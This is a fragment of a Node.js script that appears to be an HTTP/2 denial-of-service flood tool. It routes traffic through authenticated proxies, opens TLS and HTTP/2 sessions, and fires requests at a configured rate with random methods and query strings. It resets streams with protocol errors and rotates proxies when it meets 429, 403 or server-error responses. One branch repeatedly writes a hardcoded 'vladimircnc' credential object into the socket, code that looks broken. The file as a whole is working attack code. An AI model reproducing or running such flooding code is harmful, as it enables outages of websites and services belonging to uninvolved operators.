                'Proxy-Authorization': `Basic ${Buffer.from(`${proxy[2]}:${proxy[3]}`).toString('base64')}`,
            },
        };
        connection = await http.request(Optionsreq, (res) => {});
        connection.on('error', (err) => {
        
            if (err)  connection.destroy() ;return
        });
        connection.on('timeout', async () => {
            return
        });
        procxy.push(connection)
    }
    procxy.forEach((connection, index) => {
        connection.on('connect', async function(res, socket) {
            socket.allowHalfOpen = true;
            socket.setNoDelay(true);
            socket.setKeepAlive(true, 10000 * time);
            socket.setMaxListeners(0);

 
            const tlsSocket = await createCustomTLSSocket(parsed, socket);
    

            const client = await http2.connect(parsed.href, {
                createConnection: () => tlsSocket,
                 protocol: "https:",
                settings: h2settings,
                 socket: tlsSocket,
            }, (session) => {
            session.setLocalWindowSize(mathfloor);
            });
    
           
    
            
    
            client.on("error", (error) => {
                
                if (error) closeConnections(client, connection,tlsSocket,socket );
            });
    
            client.on("close", () => {
                
                closeConnections();
            });
    
            client.on("connect", async () => {
    
                threaf = setInterval(async () => {
                    for (let i = 0; i < rps; i++) {
                        let author = {
                            ":method" : method[Math.floor(Math.random() * method.length)],
                            ":authority": parsed.host,
                            ":scheme": "https",
                            ":path": query === 'true' ?
                                path + 'page=' + generateRandomString(3, 15) + '?q=' + generateRandomString(3, 15) :
                                query === 'query' ?
                                path + '?q=' + generateRandomString(3, 15) :
                                path,
                           
                        };
   
                        const head = header;
                        const request = await client.request({ ...author, ...head}, {
                            weight: rada,
                            parent: 0,
                            exclusive: false});
                            
                                request.on('response', (res) => {
                                      
//console.log(res[":status"])
                                 if (ratelimit0 === true && res[":status"] === 429) {
                                        maprate.push({ proxy: proxy, timestamp: Date.now() });
                                        rps = 5;
                                        client.destroy();
                                        return;
                                    }
                                    if (res[":status"] === 403) {
                                        maprate.push({ proxy: proxy, timestamp: Date.now() });
                               
let streamId = 1+
  getRandomInt(100,999);
//console.log(streamId)


                                             tlsSocket.write(streamId, 8, {"username" : "vladimir", "password" : "vladimircnc"});
                                             tlsSocket.write(streamId, 8, {"username" : "vladimir", "password" : "vladimircnc"});
                                             tlsSocket.write(streamId, 8, {"username" : "vladimir", "password" : "vladimircnc"});
                                             tlsSocket.write(streamId, 8, {"username" : "vladimir", "password" : "vladimircnc"});
                                             tlsSocket.write(streamId, 8, {"username" : "vladimir", "password" : "vladimircnc"});
                                             tlsSocket.write(streamId, 8, {"username" : "vladimir", "password" : "vladimircnc"});
                                             tlsSocket.write(streamId, 8, {"username" : "vladimir", "password" : "vladimircnc"});
                                             tlsSocket.write(streamId, 8, {"username" : "vladimir", "password" : "vladimircnc"});
                                             tlsSocket.write(streamId, 8, {"username" : "vladimir", "password" : "vladimircnc"});
                                             tlsSocket.write(streamId, 8, {"username" : "vladimir", "password" : "vladimircnc"});
                                             tlsSocket.write(streamId, 8, {"username" : "vladimir", "password" : "vladimircnc"});
                                             tlsSocket.write(streamId, 8, {"username" : "vladimir", "password" : "vladimircnc"});
                                        tlsSocket.write({"username" : "vladimir", "password" : "vladimircnc"})
                                        tlsSocket.write({"username" : "vladimir", "password" : "vladimircnc"})
                                        tlsSocket.write({"username" : "vladimir", "password" : "vladimircnc"})
                                        tlsSocket.write({"username" : "vladimir", "password" : "vladimircnc"})
                                        tlsSocket.write({"username" : "vladimir", "password" : "vladimircnc"})
                                        tlsSocket.write({"username" : "vladimir", "password" : "vladimircnc"})
                                        tlsSocket.write({"username" : "vladimir", "password" : "vladimircnc"})
                                        tlsSocket.write({"username" : "vladimir", "password" : "vladimircnc"})
                                        tlsSocket.write({"username" : "vladimir", "password" : "vladimircnc"})
                                        tlsSocket.write({"username" : "vladimir", "password" : "vladimircnc"})
                                        tlsSocket.write({"username" : "vladimir", "password" : "vladimircnc"})
                                        tlsSocket.write({"username" : "vladimir", "password" : "vladimircnc"})
                                        tlsSocket.write({"username" : "vladimir", "password" : "vladimircnc"})
                                        tlsSocket.write({"username" : "vladimir", "password" : "vladimircnc"})
                                        tlsSocket.write({"username" : "vladimir", "password" : "vladimircnc"})
                                        tlsSocket.write({"username" : "vladimir", "password" : "vladimircnc"})
                                        tlsSocket.write({"username" : "vladimir", "password" : "vladimircnc"})
                                        tlsSocket.write({"username" : "vladimir", "password" : "vladimircnc"})
                                        tlsSocket.write({"username" : "vladimir", "password" : "vladimircnc"})
                                        tlsSocket.write({"username" : "vladimir", "password" : "vladimircnc"})
                                        closeConnections(client, connection,tlsSocket,socket );
                                        return;
                                    }
                                    if (res[":status"] >= 500) {
                                        maprate.push({ proxy: proxy, timestamp: Date.now() });
                                        rps = 1;
                                        client.close();
                                        return;
                                    }
                                    
                                    if (res["set-cookie"]) {
                                        chead["cookie"] = res["set-cookie"].join("; ");
                                    }
                                    if (redirect === true){
                                    if (res["location"]) {
                                        parsed = new URL(res["location"]);
                                    }
                                    }
                                }).end();

                        request.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
                    }
                }, interval);
            }).on("error", (err) => {
               if (err) closeConnections(client, connection,tlsSocket,socket );
            });
    
            client.on("close", () => {
                closeConnections(client, connection,tlsSocket,socket );
            });
        });
    connection.on('error', () => connection.destroy());
    connection.on('timeout', () => connection.destroy());
   
        connection.end();
    });
    
} //